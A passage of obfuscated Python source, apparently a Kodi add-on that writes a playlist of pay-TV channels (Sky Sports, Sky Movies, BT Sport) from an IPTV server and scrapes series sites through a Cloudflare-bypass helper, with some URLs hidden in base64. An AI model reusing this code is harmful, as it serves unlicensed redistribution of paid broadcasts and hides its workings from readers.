 i11Ii1iIiII . write ( r'TG4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F192.m3u8&mode=10012&name=[COLORgreen]TG4%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'RTE One=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F194.m3u8&mode=10012&name=[COLORgreen]RTE+One+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'RTE Two=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F193.m3u8&mode=10012&name=[COLORgreen]RTE+Two+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Disney Chnl=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F398.m3u8&mode=10012&name=[COLORgreen]Disney+Channel+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Disney Junior=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F397.m3u8&mode=10012&name=[COLORgreen]Disney+Junior+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Discovery=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F395.m3u8&mode=10012&name=[COLORgreen]Discovery+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Discovery Science=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F396.m3u8&mode=10012&name=[COLORgreen]Discovery+Science+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Animal Planet=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F428.m3u8&mode=10012&name=[COLORgreen]Animal+Planet+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Disc.Turbo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F431.m3u8&mode=10012&name=[COLORgreen]Discovery+Turbo+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Nat Geo=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F429.m3u8&mode=10012&name=[COLORgreen]National+Geographic+Channel+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'MTV MUSIC=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F409.m3u8&mode=10012&name=[COLORgreen]MTV+Music+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'MTV Canada=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F417.m3u8&mode=10012&name=[COLORgreen]MTV+2+Ca%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'SkyPremiereHD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F37.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Premiere+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Action=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F39.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Action+%26+Adventure+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Thriller=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F40.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Crime+%26+Thriller+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Comedy=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F43.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Comedy+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Greats=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F41.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Greats+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky ScFiHorror=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F44.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Sci-Fi+%26+Horror+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Showcase=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F46.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Showcase+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Select=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F45.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Select+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky DramaRom=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F47.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Drama+%26+Romance+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Family=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F48.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Family+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Disney=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F195.m3u8&mode=10012&name=[COLORgreen]Sky+Movies+Disney+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Fox Movies HD MX=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F436.m3u8&mode=10012&name=[COLORgreen]Fox+Movies+HD+MX%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Film Zone MX HD=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F437.m3u8&mode=10012&name=[COLORgreen]Film+Zone+MX+HD%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Eurosport=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F269.m3u8&mode=10012&name=[COLORgreen]Eurosport+1+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F403.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+1+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F404.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+2+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports 3=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F405.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+3+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports 4=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F406.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+4+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports 5=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F407.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+5+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Sky Sports F1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F412.m3u8&mode=10012&name=[COLORgreen]Sky+Sports+F1%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'BT Sport 1=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F423.m3u8&mode=10012&name=[COLORgreen]BT+Sports+1%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'BT Sport 2=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F413.m3u8&mode=10012&name=[COLORgreen]BT+Sports+2%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Fox Sports 1 HD MX=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F439.m3u8&mode=10012&name=[COLORgreen]Fox+Sports+1+HD+MX%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ESPN 1 HD ES=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F440.m3u8&mode=10012&name=[COLORgreen]ESPN+1+HD+ES%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'ESPN 2 HD ES=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F441.m3u8&mode=10012&name=[COLORgreen]ESPN+2+HD+ES%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'At The Races=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F427.m3u8&mode=10012&name=[COLORgreen]At+The+Races+UK%0D[/COLOR]' + '\n' )
 i11Ii1iIiII . write ( r'Racing UK=plugin://plugin.video.GenieTv/?url=http%3A%2F%2Fgenietv.iptv.re%3A8000%2Flive%2F' + oO0o0o0ooO0oO + '%2F' + oo0o0O00 + '%2F426.m3u8&mode=10012&name=[COLORgreen]Racing+UK%0D[/COLOR]' + '\n' )
 if 60 - 60: Ii11I / OOOo0
 if 78 - 78: OOOO00ooo0Ooo . i1i1i11IIi
 if 38 - 38: I1IiI + i1i1i11IIi
def IIi1I1i ( ) :
 if 13 - 13: iIii1I11I1II1 . I1IiI * OOOo0 / ii * OOooOooo
 O0Oo000ooO00 ( '[COLORgreen]Recent Episodes[/COLOR]' , '' , 10019 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Genres[/COLOR]' , '' , 10020 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Search[/COLOR]' , '' , 10021 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 64 - 64: OO0O / O0 * I1IiI * OO0O
def O00oo ( ) :
 if 58 - 58: iIii1I11I1II1 - i11iIiiIii - i11iIiiIii * OOooOooo + OOooOOo . I1IiI
 OOOooo = cloudflare . source ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29t' ) )
 oOooOOOoOo = re . compile ( '<li id=".+?">.+?<a href="(.+?)">.+?<img width="40" height="40" src="(.+?)" alt=""/>.+?<span class="title">\n(.+?)</span>.+?<span class="alt-title">\n(.+?)</span>.+?</a>.+?</li>' , re . DOTALL ) . findall ( OOOooo )
 for iI1i11 , oO0O00oOOoooO , i1I1I , iiI1I in oOooOOOoOo :
  O0Oo000ooO00 ( i1I1I + '  -  ' + ( iiI1I ) . replace ( 'sezon' , 'Season' ) . replace ( 'bölüm' , 'Episode' ) , iI1i11 , 10023 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 80 - 80: i1IIi + i11iIiiIii - o0OOOoO0 % OoOoOO00 . ii
  if 10 - 10: OOOO00ooo0Ooo / OOOO00ooo0Ooo * i11iIiiIii
  if 46 - 46: Ooo00oOo00o * Oo % ii + O0 * i1i1i11IIi
def ii1I11i ( ) :
 if 89 - 89: o0OOOoO0 . i1i1i11IIi % Oo . Oo - OoooooooOO
 O0Oo000ooO00 ( '[COLORgreen]Action[/COLOR]' , 'Aksiyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Adventure[/COLOR]' , 'Macera' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Animation[/COLOR]' , 'Animasyon' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Anime[/COLOR]' , 'Anime' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Biography[/COLOR]' , 'Biyografi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Comedy[/COLOR]' , 'Komedi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Crime[/COLOR]' , 'Su%C3%A7' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Documentary[/COLOR]' , 'Belgesel' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Drama[/COLOR]' , 'Dram' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Family[/COLOR]' , 'Aile' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Fantasy[/COLOR]' , 'Fantastik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]History[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Horror[/COLOR]' , 'Korku' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Mini-Series[/COLOR]' , 'Mini%20Dizi' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Musical[/COLOR]' , 'M%C3%BCzikal' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Mystery[/COLOR]' , 'Gizem' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Romance[/COLOR]' , 'Romantik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Science Fiction[/COLOR]' , 'Bilim%20Kurgu' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Sport[/COLOR]' , 'Spor' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Thriller[/COLOR]' , 'Gerilim' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]War[/COLOR]' , 'Sava%C5%9F' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Western[/COLOR]' , 'Tarih' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 O0Oo000ooO00 ( '[COLORgreen]Youth[/COLOR]' , 'Gen%C3%A7lik' , 10024 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
 if 56 - 56: OOOO00ooo0Ooo
def IiI1 ( url ) :
 Oo0o0oooo0O0 = 'http://dizilab.com/arsiv?limit=100&tur=' + url + '&orderby=&ulke=&order=&yil=&dizi_adi='
 OO00O0O = cloudflare . source ( Oo0o0oooo0O0 )
 oOooOOOoOo = re . compile ( '<div class="tv-series-single">.+?<a href="(.+?)" class="film-image">.+?<img src="(.+?)" alt=""/>.+?<span class="position">.+?</span>\n(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
 for url , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , url , 10022 , ii11iIi1I + 'dtv.png' , i1iiIII111ii , '' )
  if 59 - 59: OOOO00ooo0Ooo / Oo / Ii11I / O0 / I1IiI + OOooOOo
  if 13 - 13: OOooOOo % ii / o0OOOoO0 % o0OOOoO0 % O0
  if 90 - 90: i1i1i11IIi . OO0O / iIii1I11I1II1
  if 28 - 28: i1i1i11IIi + ii - OO0O / iIii1I11I1II1 - OOOo0
def Ii1i1 ( ) :
 if 65 - 65: ii + ii11ii1ii / Ii11I
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 oooooo0O000o = oOOoo00O00o . lower ( )
 iI1i11 = ( i1111 ( 'aHR0cDovL2RpemlsYWIuY29tL2Fyc2l2P2xpbWl0PSZ0dXI9Jm9yZGVyYnk9JnVsa2U9Jm9yZGVyPSZ5aWw9JmRpemlfYWRpPQ==' ) ) + ( oOOoo00O00o ) . replace ( ' ' , '+' )
 OO00O0O = cloudflare . source ( iI1i11 )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" class="film-image">\n<img src="(.+?)" alt=""/>\n</a>\n<div class="tss-detail">\n<a class="title" style="" href=".+?">\n<span class="position">.+?</span>\n(.+?)</a>' ) . findall ( OO00O0O )
 for iI1i11 , oO0O00oOOoooO , i1I1I in oOooOOOoOo :
  if oOOoo00O00o in i1I1I . lower ( ) :
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , iI1i11 , 10022 , ii11iIi1I + 'dtv.png' )
   if 85 - 85: iIii1I11I1II1 / OoooooooOO % OoOoOO00
   if 49 - 49: i11iIiiIii % I1IiI + o0OOOoO0 . OoOoOO00 % O00oo0OO0oOOO * Ii11I
   if 67 - 67: i1IIi
def iiioOOOo ( url ) :
 OO00O0O = cloudflare . source ( url )
 oOooOOOoOo = re . compile ( '<a class="season" href="(.+?)">\n(.+?)\n</a>.+?<a class="episode" href=".+?">\n(.+?)\n</a>.+?<a class="episode-name" href=".+?">\n(.+?)</a>' , re . DOTALL ) . findall ( OO00O0O )
 for Iii1I1111ii , IIiIii , O0Oo0OO0 , i1I1I in oOooOOOoOo :
  I1iIiI1Iii = ( O0Oo0OO0 ) . replace ( 'Sezon' , '' ) . replace ( 'bölüm' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  O0oo = ( IIiIii ) . replace ( 'bölüm' , '' ) . replace ( 'Sezon' , '' ) . replace ( 'Bölüm' , '' ) . replace ( 'BÃ¶lÃ¼m' , '' ) . replace ( '.' , '' )
  ooOooO00Oo = 'Season ' + O0oo + 'Episode ' + I1iIiI1Iii + i1I1I
  ooO00o ( ooOooO00Oo , Iii1I1111ii )
  if 73 - 73: O00oo0OO0oOOO * O00oo0OO0oOOO / OO0O
  xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
  if 43 - 43: ii11ii1ii . i1IIi . i1i1i11IIi + O0 * OOooOooo * O0
  if 41 - 41: ii11ii1ii + OOooOooo % OoooooooOO . ii11ii1ii + O00oo0OO0oOOO . O00oo0OO0oOOO
def ooO00o ( name , url ) :
 Iii1I1111ii = url
 Iiii11I = name
 i11i1 = cloudflare . source ( Iii1I1111ii )
 IiiiiI1i1Iii = re . compile ( 'file: "(.+?)",.+?label: "(.+?)",' , re . DOTALL ) . findall ( i11i1 )
 for oo00oO0o , OO0ooo0 in IiiiiI1i1Iii :
  oo00OOoOoO00 ( '[COLORgreen]' + Iiii11I + OO0ooo0 + '[/COLOR]' , oo00oO0o , 10012 , ii11iIi1I + 'dtv.png' )
  if 7 - 7: ii11ii1ii - ii * Ii11I + OOooOOo . ii11ii1ii
 xbmcplugin . addSortMethod ( O00o0OO , xbmcplugin . SORT_METHOD_TITLE ) ;
 if 85 - 85: O0
 if 32 - 32: OoooooooOO . Ooo00oOo00o / Oo * OOooOOo / OOooOOo * OOooOooo
def iI111i11iI1 ( ) :
 if 2 - 2: I1IiI + o0OOOoO0 + OoooooooOO . i1IIi
 if 19 - 19: O00oo0OO0oOOO - OOooOOo - OOooOooo - I1IiI . O00oo0OO0oOOO . o0OOOoO0
 if 48 - 48: O00oo0OO0oOOO + i1i1i11IIi
 if 60 - 60: OOOO00ooo0Ooo + O00oo0OO0oOOO . i1i1i11IIi / i1IIi . iIii1I11I1II1
 if 14 - 14: Ii11I
 if 79 - 79: OOooOooo
 if 76 - 76: iIii1I11I1II1
 if 80 - 80: iIii1I11I1II1 . O0 / OOooOooo % OOooOooo
 if 93 - 93: OoooooooOO * Oo
 if 10 - 10: o0OOOoO0 * OoooooooOO + OOOO00ooo0Ooo - ii11ii1ii / ii11ii1ii . i11iIiiIii
 if 22 - 22: o0OOOoO0 / OOooOOo
 if 98 - 98: i1IIi
 if 51 - 51: ii11ii1ii + OO0O + Oo / i1IIi + i1IIi
 if 12 - 12: iIii1I11I1II1 . OOooOooo . ii11ii1ii % OOOo0 . OoOoOO00 . ii
 if 32 - 32: ii11ii1ii + i1i1i11IIi / O0 / I1IiI * OoooooooOO % OO0O
 O0Oo000ooO00 ( '[COLORgreen]Newest Episodes Added[/COLOR]' , 'http://www.watchseries.li/latest' , 10046 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 O0Oo000ooO00 ( '[COLORgreen]This Week\'s Popular Episodes[/COLOR]' , 'http://www.watchseries.li/new' , 10042 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 O0Oo000ooO00 ( '[COLORgreen]Search Program[/COLOR]' , '' , 10043 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 if 50 - 50: Ooo00oOo00o
 if 66 - 66: iIii1I11I1II1
def I11II1i11 ( url ) :
 OO00O0O = iii ( url )
 I1Ii = re . compile ( '<ul class="pagination" style="line-height: 3;">(.+?)</ul>' , re . DOTALL ) . findall ( OO00O0O )
 oOooOOOoOo = re . compile ( '<li><a href="/letters/(.+?)">(.+?)</a></li>' ) . findall ( str ( I1Ii ) )
 for url , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://watchseries.li/letters/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 28 - 28: OoOoOO00 - ii % I1IiI + Ooo00oOo00o - I1IiI
def IiIooo ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<a href="(.+?)" class="sr-header">(.+?)</a>' ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://watchseries.li/' + url , 10049 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
  if 68 - 68: Ii11I + ii . O0 . OOooOooo % i1IIi % Ii11I
def i1I1iI ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( OO00O0O )
 IiiiiI1i1Iii = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  O0Oo000ooO00 ( '[COLORgreen]' + ( i1I1I ) . replace ( '&nbsp;' , ' ' ) . replace ( '&amp;' , '&' ) . replace ( '&#039;' , '\'' ) + '[/COLOR]' , 'http://www.watchseries.li' + url , 10044 , ii11iIi1I + 'WATCHSERIES.png' , '' , '' )
 for url in IiiiiI1i1Iii :
  O0Oo000ooO00 ( '[COLORgreen]' + 'NEXT' + '[/COLOR]' , 'http://www.watchseries.li' + url , 10049 , ii11iIi1I + 'Next.png' , '' , '' )
  if 92 - 92: Oo / i11iIiiIii + ii11ii1ii
  if 87 - 87: I1IiI % iIii1I11I1II1
def o0OO0OOO0O ( ) :
 oOOoo00O00o = oOOoo00O0O . input ( 'Search' , type = xbmcgui . INPUT_ALPHANUM )
 Iii1I = 'http://www.watchseries.li/search/' + oOOoo00O00o . replace ( ' ' , '%20' )
 OO00O0O = iii ( Iii1I )
 oOooOOOoOo = re . compile ( '<img src="(.+?)".+?<a href="(.+?)" title=".+?"><b>(.+?)</b>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , iI1i11 , i1I1I in oOooOOOoOo :
  if 'watch online' in i1I1I :
   pass
  else :
   print iI1i11
   O0Oo000ooO00 ( '[COLORgreen]' + i1I1I + '[/COLOR]' , 'http://www.watchseries.li' + iI1i11 , 10044 , oO0O00oOOoooO , '' , '' )
   if 75 - 75: i1i1i11IIi
   xbmcplugin . setContent ( O00o0OO , 'movies' )
   if 35 - 35: OOOo0
def iiII1iiIi ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<img src="(.+?)".+?<div class="block-left-home-inside-text">.+?<a href="(.+?)" title=".+?"><b>(.+?)</b> <br>.+?<span class=".+?">(.+?)</span></a><br>(.+?)<br>' , re . DOTALL ) . findall ( OO00O0O )
 for oO0O00oOOoooO , url , i1I1I , O0Oo0OO0 , OOoooO00o0oo0 in oOooOOOoOo :
  iI1i1I1III1i = ( i1I1I ) . replace ( '&nbsp;' , ' ' ) . replace ( '&amp;' , '&' ) . replace ( '&#039;' , '\'' ) + ' - ' + ( O0Oo0OO0 ) . replace ( '&amp;' , '&' ) . replace ( '&#039;' , '\'' )
  O0Oo000ooO00 ( '[COLORgreen]' + iI1i1I1III1i + '[/COLOR]' , 'http://www.watchseries.li' + url , 10045 , oO0O00oOOoooO , '' , OOoooO00o0oo0 )
  if 68 - 68: OOooOooo - ii + Oo
def i11Iii1Ii1i1 ( url ) :
 OO00O0O = iii ( url )
 oOooOOOoOo = re . compile ( '<li class="col-md-6 col-xs-12 list-movies-li"><a href="(.+?)" title=".+?">(.+?)<span class="epnum">.+?</span></a></li>' , re . DOTALL ) . findall ( OO00O0O )
 IiiiiI1i1Iii = re . compile ( '&hellip;<li><a href=".+?">.+?</a></li><li><a href=".+?">.+?</a></li><li><a href="(.+?)">Next</a></li></ul>' , re . DOTALL ) . findall ( OO00O0O )
 for url , i1I1I in oOooOOOoOo :
  iI1i1I1III1i = ( i1I1I ) . replace ( '&nbsp;' , ' ' ) . replace ( '&amp;' , '&' ) . replace ( '&#039;' , '\'' )
